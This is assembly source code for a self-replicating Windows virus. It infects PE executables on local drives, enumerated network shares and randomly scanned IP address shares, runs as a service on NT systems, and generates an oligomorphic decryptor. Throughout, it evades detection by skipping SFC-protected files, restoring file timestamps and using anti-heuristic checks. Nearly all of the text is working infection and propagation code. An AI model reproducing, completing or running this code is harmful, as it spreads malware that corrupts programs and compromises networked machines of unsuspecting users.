        call    eax
        test    bl, 1 shl state_ret
        je      store_block2
        pop     edi
        call    find_mzhdr

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (krncrc_count + 1) dup (0)
krncrcend       label   near
        dd      offset swap_create - offset krncrcend + 4

;-----------------------------------------------------------------------------
;swap CreateFileW and CreateFileMappingA because of alphabet order
;-----------------------------------------------------------------------------

swap_create     label   near
        mov     dword ptr [edi + offset store_krnapi - offset swap_create + 3], esp
        mov     ebx, esp
        mov     eax, dword ptr [ebx + krncrcstk.kCreateFileMappingA]
        xchg    dword ptr [ebx + krncrcstk.kCreateFileW], eax
        mov     dword ptr [ebx + krncrcstk.kCreateFileMappingA], eax

;-----------------------------------------------------------------------------
;get SFC support if available
;-----------------------------------------------------------------------------

        call    load_sfc
        db      "sfc_os", 0                     ;Windows XP (forwarder chain from sfc.dll)

load_sfc        label   near
        call    cLoadLibraryA
        test    eax, eax
        jne     found_sfc
        push    'cfs'                           ;Windows Me/2000
        push    esp
        call    cLoadLibraryA
        pop     ecx
        test    eax, eax
        je      sfcapi_esp

found_sfc       label   near
        push    edi
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

sfccrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (sfccrc_count + 1) dup (0)
sfccrcend       label   near
        dd      offset sfcapi_pop - offset sfccrcend + 4

sfcapi_pop      label   near
        pop     eax
        pop     edi

sfcapi_esp      label   near
        mov     dword ptr [edi + offset store_sfcapi - offset swap_create + 1], eax

;-----------------------------------------------------------------------------
;get rest of APIs required for network thread
;-----------------------------------------------------------------------------

        push    'rpm'
        push    esp
        call    cLoadLibraryA
        pop     ecx
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

netcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (netcrc_count + 1) dup (0)
netcrcend       label   near
        dd      offset netapi_esp - offset netcrcend + 4

netapi_esp      label   near
        mov     eax, dword ptr [esp + netcrcstk.nWNetCloseEnum - netcrcstk.nWNetOpenEnumW]
        mov     dword ptr [edi + offset store_netapi - offset netapi_esp + 1], eax

;-----------------------------------------------------------------------------
;initialise service table if NT/2000/XP
;-----------------------------------------------------------------------------

        call    cGetVersion
        shr     eax, 1fh
        jne     svc_main                        ;no service if 9x/Me
        push    eax
        push    eax
        lea     eax, dword ptr [edi + offset regdll - offset netapi_esp]
        push    eax
        call    cLoadLibraryA
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

svccrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (svccrc_count + 1) dup (0)
svccrcend       label   near
        dd      offset start_disp - offset svccrcend + 4

start_disp      label   near
        pop     eax
        mov     ecx, esp
        add     edi, offset svc_main - offset start_disp
        push    edi
        push    ecx
        push    esp
        call    eax                             ;does not return if service launch
        add     esp, size SERVICE_TABLE_ENTRY   ;fix stack if app launch

svc_main        label   near
        push    eax
        push    esp
        xor     esi, esi
        push    esi
        push    esi
        call    create_thr1

;-----------------------------------------------------------------------------
;thread 1: infect files on all fixed and remote drive letters
;-----------------------------------------------------------------------------

find_drives     proc    near
        mov     eax, '\:A'                      ;NEC-PC98 uses A: for boot drive which can be hard disk

drive_loop      label   near
        push    eax
        push    esp
        push    (krncrcstk.kGetDriveTypeA - krncrcstk.klstrlenW) shr 2
        pop     eax
        call    store_krnapi
        sub     al, DRIVE_FIXED
        je      drive_set
        xchg    ecx, eax
        loop    drive_next                      ;loop if not DRIVE_REMOTE

drive_set       label   near
        push    esp
        call    cSetCurrentDirectoryA
        call    find_files

drive_next      label   near
        pop     eax
        inc     eax
        cmp     al, 'Z' + 1
        jne     drive_loop
        push    10 * 60 * 1000                  ;10 minutes
        call    cSleep
        jmp     find_drives
find_drives     endp

create_thr1     label   near
        push    esi
        push    esi
        call    cCreateThread
        push    esp
        push    esi
        push    esi
        call    create_thr2

;-----------------------------------------------------------------------------
;thread 2: find files on network shares using non-recursive algorithm
;-----------------------------------------------------------------------------

        call    get_krnapis

find_wnet       proc    near
        xor     ebx, ebx                        ;previous handle
        xor     esi, esi                        ;previous node
        xor     edi, edi                        ;previous buffer

wnet_open       label   near
        push    eax
        push    esp
        push    edi
        push    0
        push    RESOURCETYPE_DISK
        push    RESOURCE_GLOBALNET
        call    dword ptr [ebp + netcrcstk.nWNetOpenEnumW - size netcrcstk]
        push    eax
        push    edi
        call    cGlobalFree
        pop     ecx
        pop     edi
        inc     ecx
        loop    wnet_next
        push    size wnetlist
        push    ecx                             ;GMEM_FIXED
        call    cGlobalAlloc
        mov     dword ptr [eax + wnetlist.wnetprev], esi
        mov     dword ptr [eax + wnetlist.wnethand], ebx
        xchg    esi, eax
        mov     ebx, edi

wnet_next       label   near
        push    1
        mov     eax, esp
        push    eax
        push    esp
        push    eax
        push    ebx
        call    dword ptr [ebp + netcrcstk.nWNetEnumResourceW - size netcrcstk]
        pop     edi
        sub     al, ERROR_MORE_DATA
        jne     wnet_close
        push    edi
        push    eax                             ;GMEM_FIXED
        call    cGlobalAlloc
        xchg    ecx, eax
        jecxz   wnet_close
        push    edi
        mov     eax, esp
        push    1
        mov     edx, esp
        push    eax
        push    ecx
        push    edx
        push    ebx
        mov     edi, ecx
        call    dword ptr [ebp + netcrcstk.nWNetEnumResourceW - size netcrcstk]
        pop     ecx
        pop     ecx
        test    eax, eax
        jne     wnet_free
        test    byte ptr [edi + NETRESOURCE.dwUsage], RESOURCEUSAGE_CONTAINER
        jne     wnet_open
        push    dword ptr [edi + NETRESOURCE.lpRemoteName]
        call    dword ptr [ebp + krncrcstk.kSetCurrentDirectoryW]
        xchg    ecx, eax
        jecxz   wnet_skipdir

        ;I'm alone here
        ;with emptiness eagles and snow.
        ;Unfriendliness chilling my body
        ;and taunting with pictures of home.
        ;(Deep Purple)

        call    find_files

wnet_skipdir    label   near
        xor     eax, eax

wnet_free       label   near
        push    eax
        push    edi
        call    cGlobalFree
        pop     ecx
        jecxz   wnet_next

wnet_close      label   near
        push    ebx

store_netapi    label   near
        mov     eax, '!bgr'
        call    eax                             ;WNetCloseEnum
        mov     ecx, dword ptr [esi + wnetlist.wnetprev]
        jecxz   wnet_exit
        mov     ebx, dword ptr [esi + wnetlist.wnethand]
        push    esi
        mov     esi, ecx
        call    cGlobalFree
        jmp     wnet_next

wnet_exit       label   near
        push    20 * 60 * 1000                  ;20 minutes
        call    cSleep
        jmp     find_wnet
find_wnet       endp

create_thr2     label   near
        push    esi
        push    esi
        call    cCreateThread

;-----------------------------------------------------------------------------
;thread 3: find files on random IP address shares using non-recursive algorithm
;(alter class A: 25%, class b: 25%, class c: 25%, class d: scan all)
;-----------------------------------------------------------------------------

        call    cGetVersion
        test    eax, eax
        mov     eax, 'aten'
        mov     ecx, '23ip'                     ;"netapi32" (NT/2000/XP)
        jns     ip_loaddll
        mov     eax, 'arvs'
        movzx   ecx, cx                         ;"svrapi" (9x/Me)

ip_loaddll      label   near
        pushfd
        push    esi
        push    ecx
        push    eax
        push    esp
        call    cLoadLibraryA
        add     esp, 0ch
        popfd
        jns     ip_getprocnt
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

ip9xcrcbegin    label   near                    ;place < 80h bytes from call for smaller code
        dd      (ip9xcrc_count + 1) dup (0)
ip9xcrcend      label   near
        dd      offset ip_share - offset ip9xcrcend + 4

ip_getprocnt    label   near
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

ipntcrcbegin    label   near                    ;place < 80h bytes from call for smaller code
        dd      (ipntcrc_count + 1) dup (0)
ipntcrcend      label   near
        dd      offset ip_share - offset ipntcrcend + 4

ip_share        label   near
        call    random
        xchg    ebp, eax                        ;initial IP address

find_ip         proc    near
        call    random
        and     al, 18h
        je      find_ip                         ;select class A-C only
        xchg    ecx, eax
        xor     eax, eax
        mov     al, 0ffh
        shl     eax, cl                         ;select random class
        and     ecx, eax                        ;isolate new class
        not     eax
        and     ebx, eax                        ;remove old class
        or      ebx, ecx                        ;insert new class

ip_save         label   near
        push    ebx
        bswap   ebx
        enter   34h, 0                          ;size of Unicode '\\' + Unicode IP address + '\' + ANSI sharename
        lea     edi, dword ptr [ebp - 0eh]      ;size of '\' + ANSI sharename
        call    cGetVersion
        shr     eax, 1fh                        ;0 if Unicode, 1 if ANSI
        xchg    esi, eax
        xor     al, al
        mov     cl, 0ah
        std
        stos    byte ptr [edi]
        mov     edx, edi
        stos    byte ptr [edi]                  ;store Unicode sentinel
        stos    byte ptr [edi]                  ;store Unicode half-character
        add     edi, esi                        ;remove character if ANSI

;-----------------------------------------------------------------------------
;convert IP address to string (ANSI or Unicode)
;-----------------------------------------------------------------------------

ip_shift        label   near
        xor     eax, eax
        shld    eax, ebx, 8

ip_hex2dec      label   near
        div     cl
        xchg    ah, al
        add     al, '0'
        stos    byte ptr [edi]
        xor     al, al
        stos    byte ptr [edi]                  ;store Unicode half-character
        add     edi, esi                        ;remove character if ANSI
        shr     eax, 8
        jne     ip_hex2dec
        mov     al, '.'
        stos    byte ptr [edi]
        xor     al, al
        stos    byte ptr [edi]                  ;store Unicode half-character
        add     edi, esi                        ;remove character if ANSI
        shl     ebx, 8
        jne     ip_shift
        cld
        push    edi
        mov     al, '\'
        stos    byte ptr [edi]
        inc     edi                             ;include Unicode half-character
        sub     edi, esi                        ;remove character if ANSI
        stos    byte ptr [edi]                  ;store '\\' in ANSI or Unicode
        pop     edi
        test    esi, esi
        je      ip_sharent

;-----------------------------------------------------------------------------
;enumerate shares on IP address (9x/Me platform)
;-----------------------------------------------------------------------------

        push    ebx
        mov     eax, esp
        push    ebx
        push    esp
        push    eax
        push    ebx                             ;too small size returns needed size
        push    ebx
        push    1
        push    edi
        mov     ebx, edi
        mov     edi, edx
        call    dword ptr [esp + 44h + ip9xcrcstk.ip9xNetShareEnum + 18h]
        pop     ecx
        pop     esi
        sub     al, ERROR_MORE_DATA
        jne     ip_restore
        imul    esi, ecx, size share_info_19x + 50
                                                ;include size of optional remark
        push    esi
        push    eax                             ;GMEM_FIXED
        call    cGlobalAlloc
        cdq
        xchg    ecx, eax
        jecxz   ip_restore
        push    ecx                             ;GlobalFree
        push    edx
        mov     eax, esp
        push    edx
        push    esp
        push    eax
        push    esi
        push    ecx
        push    1
        push    ebx
        mov     esi, ecx
        call    dword ptr [esp + 48h + ip9xcrcstk.ip9xNetShareEnum + 18h]
        pop     ecx
        pop     ecx
        mov     al, '\'
        stos    byte ptr [edi]

ip_next9x       label   near
        push    ecx
        push    edi
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]
        movs    byte ptr [edi], byte ptr [esi]  ;attach sharename
        pop     edi
        push    ebx
        call    cSetCurrentDirectoryA
        xchg    ecx, eax
        jecxz   ip_skip9x

        ;I dream of rain, I live my years under an open sky

        call    find_files

ip_skip9x       label   near
        add     esi, size share_info_19x - share_info_19x.shi1_pad1
        pop     ecx
        loop    ip_next9x

ip_free9x       label   near
        call    cGlobalFree

ip_restore      label   near
        leave
        pop     ebx
        inc     bl
        jne     ip_save
        push    20 * 60 * 1000                  ;20 minutes
        call    cSleep
        jmp     find_ip

ip_sharent      label   near

;-----------------------------------------------------------------------------
;enumerate shares on IP address (NT/2000/XP platform)
;-----------------------------------------------------------------------------

        push    eax
        mov     eax, esp
        push    eax
        mov     ecx, esp
        push    ebx
        push    esp
        push    eax
        push    MAX_PREFERRED_LENGTH
        push    ecx
        push    1
        push    edi
        call    dword ptr [esp + 44h + ipntcrcstk.ipntNetShareEnum + 1ch]
        test    eax, eax
        pop     esi
        pop     ebx
        push    esi                             ;NetApiBufferFree
        jne     ip_freent

ip_nextnt       label   near
        push    esi
        lods    dword ptr [esi]
        push    eax
        xchg    esi, eax
        xor     eax, eax                        ;lstrlenW
        call    store_krnapi
        lea     eax, dword ptr [eax + eax + 26h]
                                                ;include size of Unicode '\\' + Unicode IP address + Unicode '\'
        push    eax
        push    GMEM_FIXED
        call    cGlobalAlloc
        xchg    ecx, eax
        jecxz   ip_freent
        push    ecx                             ;GlobalFree
        push    ecx                             ;SetCurrentDirectoryW
        push    esi                             ;lstrcatW
        push    ecx                             ;lstrcatW
        push    '\'
        push    esp                             ;lstrcatW
        push    ecx                             ;lstrcatW
        push    edi
        push    ecx
        push    (krncrcstk.klstrcpyW - krncrcstk.klstrlenW) shr 2
        pop     eax
        call    store_krnapi                    ;copy IP address
        call    clstrcatW                       ;attach '\'
        pop     eax
        call    clstrcatW                       ;attach sharename
        push    (krncrcstk.kSetCurrentDirectoryW - krncrcstk.klstrlenW) shr 2
        pop     eax
        call    store_krnapi
        xchg    esi, eax
        call    cGlobalFree
        test    esi, esi
        je      ip_skipnt

        ;when you look into the abyss, the abyss looks back at you

        call    find_files

ip_skipnt       label   near
        pop     esi
        add     esi, size share_info_1nt
        dec     ebx
        jne     ip_nextnt

ip_freent       label   near
        call    dword ptr [esp + 3ch + ipntcrcstk.ipntNetApiBufferFree + 4]
        jmp     ip_restore
find_ip         endp

;-----------------------------------------------------------------------------
;create oligomorphic decryptor
;-----------------------------------------------------------------------------

storeebx        proc    near
        test    bh, 1 shl state_loadebx
        jne     storeebx_ret                    ;done already
        mov     al, 0bbh                        ;mov ebx
        mov     edx, esi
        test    bl, state_esifirst
        jne     storeebx_test                   ;esi first
        mov     dword ptr [esp + offset store_baseptr - offset efishnc_inf + 0dh], edi
        jmp     storeebx_now

storeebx_test   label   near
        test    bh, 1 shl state_loadesi
        je      storeebx_ret                    ;require esi first
        mov     al, 8dh                         ;lea
        stos    byte ptr [edi]
        mov     al, 9eh                         ;ebx
        sub     edx, dword ptr [esp + 4]
        test    bl, state_decdown
        je      storeebx_now
        sub     edx, vsize
        sub     edx, ecx

storeebx_now    label   near
        inc     bh                              ;or bh, 1 shl state_loadebx
        stos    byte ptr [edi]
        xchg    edx, eax
        stos    dword ptr [edi]

storeebx_ret    label   near
        ret
storeebx        endp

storeesi        proc    near
        test    bh, 1 shl state_loadesi
        jne     storeesi_ret                    ;done already
        mov     al, 0beh                        ;mov esi
        mov     edx, dword ptr [esp + 4]
        test    bl, state_esifirst
        je      storeesi_ebx                    ;ebx first
        mov     dword ptr [esp + offset store_baseptr - offset efishnc_inf + 0dh], edi
        test    bl, state_decdown
        je      storeesi_now
        add     edx, vsize
        jmp     storeesi_rand

storeesi_ebx    label   near
        test    bh, 1 shl state_loadebx
        je      storeesi_ret                    ;require ebx first
        mov     al, 8dh                         ;lea
        stos    byte ptr [edi]
        mov     al, 0b3h                        ;esi
        sub     edx, esi
        test    bl, state_decdown
        je      storeesi_now
        add     edx, vsize

storeesi_rand   label   near
        add     edx, ecx

storeesi_now    label   near
        or      bh, 1 shl state_loadesi
        stos    byte ptr [edi]
        xchg    edx, eax
        stos    dword ptr [edi]

storeesi_ret    label   near
        ret
storeesi        endp

storeenter      proc    near
        bts     ebx, state_entered + 8
        jb      storeenter_ret                  ;done already
        mov     al, 0c8h                        ;enter
        stos    byte ptr [edi]
        xchg    ebp, eax
        stos    dword ptr [edi]
        dec     edi                             ;xxxx, 00

storeenter_ret  label   near
        ret
storeenter      endp

storeedi        proc    near
        test    bh, 1 shl state_entered
        je      storeedi_ret                    ;require enter first
        bts     ebx, state_loadedi + 8
        jb      storeedi_ret                    ;done already
        mov     edx, 0effdfce7h                 ;ebp / esp
        test    bl, state_decdown
        je      storeedi_swap
        bswap   edx                             ;use ebp

storeedi_swap   label   near
        call    random
        and     al, 2
        je      storeedi_now
        mov     dl, dh                          ;use other encoding

storeedi_now    label   near
        add     al, 89h                         ;mov edi
        stos    byte ptr [edi]
        xchg    edx, eax
        stos    byte ptr [edi]

storeedi_ret    label   near
        ret
storeedi        endp

storestd        proc    near
        bts     ebx, state_std + 8
        jb      storestd_ret                    ;done already
        test    bl, state_decdown
        je      storestd_ret                    ;not needed
        mov     al, 0fdh                        ;std
        stos    byte ptr [edi]

storestd_ret    label   near
        ret
storestd        endp

storepushb      proc    near
        test    bh, 1 shl state_loadedi
        je      storepushb_ret                  ;require mov edi first
        bts     ebx, state_pushreg1 + 8
        jb      storepushb_ret                  ;done already
        test    bl, state_pushret or state_pushb
        je      storepushb_ret                  ;jmp esp
        jpo     storepushb_ret                  ;push at end
        call    random
        test    al, 1
        mov     al, 54h                         ;push esp
        je      storepushb_now
        test    bh, 1 shl state_loadedi
        jnb     storepushb_now                  ;requires mov edi first
        mov     al, 57h                         ;push edi

storepushb_now  label   near
        stos    byte ptr [edi]

storepushb_ret  label   near
        ret
storepushb      endp

storelods       proc    near
        bts     ebx, state_lods + 8
        jb      storelods_ret                   ;done already
        mov     al, 0ach                        ;lods byte ptr [esi]
        test    bl, state_movesi
        je      storelods_now
        mov     al, 8ah                         ;mov al, byte ptr []
        stos    byte ptr [edi]
        mov     al, 6                           ;esi

storelods_now   label   near
        stos    byte ptr [edi]

storelods_ret   label   near
        ret
storelods       endp

storexlat       proc    near
        test    bh, 1 shl state_lods
        je      storexlat_ret                   ;require lods first
        bts     ebx, state_xlat + 8
        jb      storexlat_ret                   ;done already
        mov     al, 0d7h                        ;xlat byte ptr [ebx]
        stos    byte ptr [edi]

storexlat_ret   label   near
        ret
storexlat       endp

storestos       proc    near
        test    bh, 1 shl state_xlat
        je      storestos_ret                   ;require xlat first
        bts     ebx, state_stos + 8
        jb      storestos_ret                   ;done already
        mov     al, 0aah                        ;stos byte ptr [esi]
        test    bl, state_movedi
        je      storestos_now
        mov     al, 88h                         ;mov byte ptr [], al
        stos    byte ptr [edi]
        mov     al, 7                           ;edi

storestos_now   label   near
        stos    byte ptr [edi]

storestos_ret   label   near
        ret
storestos       endp

storeincs       proc    near
        test    bh, 1 shl state_lods
        je      storeincs_ret                   ;require lods first
        bts     ebx, state_incesi + 8
        jb      storeincs_ret                   ;done already
        test    bl, state_movesi
        je      storeincs_ret                   ;not needed
        mov     al, 46h                         ;inc esi
        test    bl, state_decdown
        je      storeincs_now
        mov     al, 4eh                         ;dec esi

storeincs_now   label   near
        stos    byte ptr [edi]

storeincs_ret   label   near
        ret
storeincs       endp

storeincd       proc    near
        test    bh, 1 shl state_stos
        je      storeincd_ret                   ;require stos first
        bts     ebx, state_incedi + 8
        jb      storeincd_ret                   ;done already
        test    bl, state_movedi
        je      storeincd_ret                   ;not needed
        mov     al, 47h                         ;inc edi
        test    bl, state_decdown
        je      storeincd_now
        mov     al, 4fh                         ;dec edi

storeincd_now   label   near
        stos    byte ptr [edi]

storeincd_ret   label   near
        ret
storeincd       endp

storecmp        proc    near
        test    bh, 1 shl state_incedi
        je      storecmp_ret                    ;require inc edi first
        bts     ebx, state_cmp + 8
        jb      storecmp_ret                    ;done already
        mov     edx, 0fce7fdefh                 ;esp / ebp
        test    bl, state_decdown
        je      storecmp_jg
        bswap   edx                             ;use esp

storecmp_jg     label   near
        test    bl, state_jg
        je      storecmp_swap
        xchg    dl, dh

storecmp_swap   label   near
        call    random
        and     al, 2
        je      storecmp_now
        mov     dl, dh                          ;use other encoding

storecmp_now    label   near
        add     al, 39h                         ;cmp edi
        stos    byte ptr [edi]
        xchg    edx, eax
        stos    byte ptr [edi]

storecmp_ret    label   near
        ret
storecmp        endp

storejne        proc    near
        test    bh, 1 shl state_cmp
        je      storejne_ret                    ;require cmp first
        bts     ebx, state_branch + 8
        jb      storejne_ret                    ;done already
        mov     edx, 7e767c72h                  ;jle, jbe, jl, jb
        test    bl, state_jg
        je      storejne_swap
        mov     edx, 7d737f77h                  ;jge, jae, jg, ja

storejne_swap   label   near
        test    bl, state_decdown
        je      storejne_now
        shld    eax, edx, 10h
        xchg    dx, ax                          ;reverse must use j?e

storejne_now    label   near
        call    random
        and     al, 18h
        xchg    ecx, eax
        rol     edx, cl                         ;random branch type
        xchg    edx, eax
        stos    byte ptr [edi]
        sub     ebp, edi
        dec     ebp
        xchg    ebp, eax
        stos    byte ptr [edi]

storejne_ret    label   near
        ret
storejne        endp

storepushe      proc    near
        test    bh, 1 shl state_branch
        je      storepushe_ret                  ;require branch first
        bts     ebx, state_pushreg2 + 8
        jb      storepushe_ret                  ;done already
        test    bl, state_pushret or state_pushb
        jpe     storepushe_ret                  ;jmp esp or push at begin
        mov     al, 54h                         ;push esp
        stos    byte ptr [edi]

storepushe_ret  label   near
        ret
storepushe      endp

storeret        proc    near
        test    bh, bh                          ;test bh, 1 shl state_pushreg2
        jns     storeret_ret                    ;require push at end first
        mov     al, 0c3h                        ;ret
        test    bl, state_pushret
        jne     storeret_now
        mov     al, 0ffh                        ;jmp
        stos    byte ptr [edi]
        mov     al, 0e4h                        ;esp

storeret_now    label   near
        or      bl, 1 shl state_ret
        stos    byte ptr [edi]

storeret_ret    label   near
        ret
storeret        endp

;-----------------------------------------------------------------------------
;Mersenne Twister RNG MT19937 (c) 1997 Makoto Matsumoto and Takuji Nishimura
;period is ((2^19937)-1) with 623-dimensionally equidistributed sequence
;asm port and size optimise by rgb in 2002
;-----------------------------------------------------------------------------

randinit        proc    near                    ;eax = seed, ecx = 0, edi -> unaligned RNG cache
        pushad
        or      edi, 3
        inc     edi                             ;dword align
        push    edi
        or      eax, 1
        mov     cx, statelen

init_loop       label   near
        stos    dword ptr [edi]
        mov     edx, 69069
        mul     edx                             ;Knuth: x_new = x_old * 69069
        loop    init_loop
        inc     ecx                             ;force reload
        call    initdelta

initdelta       label   near
        pop     edi
        add     edi, offset randvars - offset initdelta
        xchg    ecx, eax
        stos    dword ptr [edi]
        pop     eax
        stos    dword ptr [edi]
        stos    dword ptr [edi]
        popad
        ret
randinit        endp

random          proc    near
        pushad
        call    randelta

randvars        label   near
        db      'rgb!'                          ;numbers left
        db      'rgb!'                          ;next pointer
        db      'rgb!'                          ;state pointer

randelta        label   near
        pop     esi
        push    esi
        lods    dword ptr [esi]
        xchg    ecx, eax
        lods    dword ptr [esi]
        xchg    esi, eax
        loop    random_ret
        mov     cx, statelen - period
        mov     esi, dword ptr [eax]
        lea     ebx, dword ptr [esi + (period * 4)]
        mov     edi, esi
        push    esi
        lods    dword ptr [esi]
        xchg    edx, eax
        call    twist
        pop     ebx
        mov     cx, period - 1
        push    ecx
        push    ebx
        call    twist
        pop     esi
        push    esi
        inc     ecx
        call    twist
        xchg    edx, eax
        pop     esi
        pop     ecx
        inc     ecx

random_ret      label   near
        lods    dword ptr [esi]
        mov     edx, eax
        shr     eax, tshiftU
        xor     eax, edx
        mov     edx, eax
        shl     eax, tshiftS
        and     eax, tmaskB
        xor     eax, edx
        mov     edx, eax
        shl     eax, tshiftT
        and     eax, tmaskC
        xor     eax, edx
        mov     edx, eax
        shr     eax, tshiftL
        xor     eax, edx
        pop     edi
        mov     dword ptr [esp + 1ch], eax      ;eax in pushad
        xchg    ecx, eax
        stos    dword ptr [edi]
        xchg    esi, eax
        stos    dword ptr [edi]
        popad
        ret
random          endp

twist           proc    near
        lods    dword ptr [esi]
        push    eax
        add     eax, eax                        ;remove highest bit
        add     edx, edx                        ;test highest bit
        rcr     eax, 2                          ;merge bits and test lowest bit
        jnb     twist_skip                      ;remove branch but larger using:
        xor     eax, matrixA                    ;sbb edx, edx+and edx, matrixA+xor eax, edx

twist_skip      label   near
        xor     eax, dword ptr [ebx]
        add     ebx, 4
        stos    dword ptr [edi]
        pop     edx
        loop    twist
        ret
twist           endp

;-----------------------------------------------------------------------------
;non-recursive directory traverser
;-----------------------------------------------------------------------------

find_files      proc    near
        pushad
        push    size findlist
        push    GMEM_ZEROINIT
        call    cGlobalAlloc
        test    eax, eax
        je      file_exit
        xchg    esi, eax
        call    get_krnapis

file_first      label   near
        push    '*'                             ;ANSI-compatible Unicode findmask
        mov     eax, esp
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        push    eax
        call    dword ptr [ebp + krncrcstk.kFindFirstFileW]
        pop     ecx
        mov     dword ptr [esi + findlist.findhand], eax
        inc     eax
        je      file_prev

        ;you must always step forward from where you stand

test_dirfile    label   near
        mov     eax, dword ptr [ebx + WIN32_FIND_DATA.dwFileAttributes]
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        je      test_file
        cmp     byte ptr [edi], '.'             ;ignore . and .. (but also .* directories under NT/2000/XP)
        je      file_next

;-----------------------------------------------------------------------------
;enter subdirectory, and allocate another list node
;-----------------------------------------------------------------------------

        push    edi
        call    dword ptr [ebp + krncrcstk.kSetCurrentDirectoryW]
        xchg    ecx, eax
        jecxz   file_next
        push    size findlist
        push    GMEM_FIXED
        call    cGlobalAlloc
        xchg    ecx, eax
        jecxz   step_updir
        xchg    esi, ecx
        mov     dword ptr [esi + findlist.findprev], ecx
        jmp     file_first

file_exit       label   near
        popad
        ret

file_next       label   near
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        mov     edi, dword ptr [esi + findlist.findhand]
        push    edi
        call    dword ptr [ebp + krncrcstk.kFindNextFileW]
        test    eax, eax
        jne     test_dirfile

;-----------------------------------------------------------------------------
;close find, and free list node
;-----------------------------------------------------------------------------

        push    edi
        mov     al, (krncrcstk.kFindClose - krncrcstk.klstrlenW) shr 2
        call    store_krnapi

file_prev       label   near
        push    esi
        mov     esi, dword ptr [esi + findlist.findprev]
        call    cGlobalFree
        test    esi, esi
        je      file_exit

step_updir      label   near

;-----------------------------------------------------------------------------
;the ANSI string ".." can be used, even on Unicode platforms
;-----------------------------------------------------------------------------

        push    '..'
        push    esp
        call    cSetCurrentDirectoryA
        pop     eax
        jmp     file_next

test_file       label   near

;-----------------------------------------------------------------------------
;get full path and convert to Unicode if required (SFC requires Unicode path)
;-----------------------------------------------------------------------------

        push    eax                             ;save original file attributes for close
        mov     eax, ebp
        enter   MAX_PATH * 2, 0
        mov     ecx, esp
        push    eax
        push    esp
        push    ecx
        push    MAX_PATH
        push    edi
        call    dword ptr [eax + krncrcstk.kGetFullPathNameW]
        xchg    edi, eax
        pop     eax
        xor     ebx, ebx
        call    cGetVersion
        test    eax, eax
        jns     store_sfcapi
        mov     ecx, esp
        xchg    ebp, eax
        enter   MAX_PATH * 2, 0
        xchg    ebp, eax
        mov     eax, esp
        push    MAX_PATH
        push    eax
        inc     edi
        push    edi
        push    ecx
        push    ebx                             ;use default translation
        push    ebx                             ;CP_ANSI
        push    (krncrcstk.kMultiByteToWideChar - krncrcstk.klstrlenW) shr 2
        pop     eax
        call    store_krnapi

store_sfcapi    label   near

;-----------------------------------------------------------------------------
;don't touch protected files
;-----------------------------------------------------------------------------

        mov     ecx, '!bgr'                     ;SfcIsFileProtected
        xor     eax, eax                        ;fake success in case of no SFC
        jecxz   leave_sfc
        push    esp
        push    ebx
        call    ecx

leave_sfc       label   near
        leave
        test    eax, eax
        jne     restore_attr
        call    set_fileattr
        push    ebx
        push    ebx                             ;attribute ignored for existing files
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    GENERIC_READ or GENERIC_WRITE
        push    edi
        call    dword ptr [ebp + krncrcstk.kCreateFileW]
        xchg    ebx, eax
        call    test_infect
        db      81h                             ;mask CALL
        call    infect_file                     ;Super Nashwan power ;)

close_file      label   near                    ;label required for delta offset
        lea     eax, dword ptr [esi + findlist.finddata.ftLastWriteTime]
        push    eax
        sub     eax, 8
        push    eax
        sub     eax, 8
        push    eax
        push    ebx
        push    (krncrcstk.kSetFileTime - krncrcstk.klstrlenW) shr 2
        pop     eax
        call    store_krnapi
        push    ebx
        call    cCloseHandle

restore_attr    label   near
        pop     ebx                             ;restore original file attributes
        call    set_fileattr
        jmp     file_next
find_files      endp

;-----------------------------------------------------------------------------
;look for MZ and PE file signatures
;-----------------------------------------------------------------------------

is_pehdr        proc    near                    ;edi -> map view
        cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
        jne     pehdr_ret
        mov     esi, dword ptr [edi + mzhdr.mzlfanew]
        add     esi, edi
        lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
        add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX

pehdr_ret       label   near
        ret                                     ;if PE file, then eax = 0, esi -> COFF header, Z flag set
is_pehdr        endp

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

set_fileattr    proc    near                    ;ebx = file attributes, esi -> findlist, ebp -> platform APIs
        push    ebx
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        push    edi
        call    dword ptr [ebp + krncrcstk.kSetFileAttributesW]
        ret                                     ;edi -> filename
        db      "02/02/02"
set_fileattr    endp

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_infect     proc    near                    ;esi = find data, edi = map view, ebp -> platform APIs
        call    map_view
        mov     ebp, esi
        call    is_pehdr
        jne     inftest_ret
        lods    dword ptr [esi]
        cmp     ax, IMAGE_FILE_MACHINE_I386
        jne     inftest_ret                     ;only Intel 386+
        shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
        lea     edx, dword ptr [eax * 4 + eax]  ;complete multiply by 28h (size pesect)
        mov     eax, dword ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate]

;-----------------------------------------------------------------------------
;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
;no .dll files this time
;-----------------------------------------------------------------------------

        test    ah, (IMAGE_FILE_SYSTEM or IMAGE_FILE_DLL or IMAGE_FILE_UP_SYSTEM_ONLY) shr 8
        jne     inftest_ret

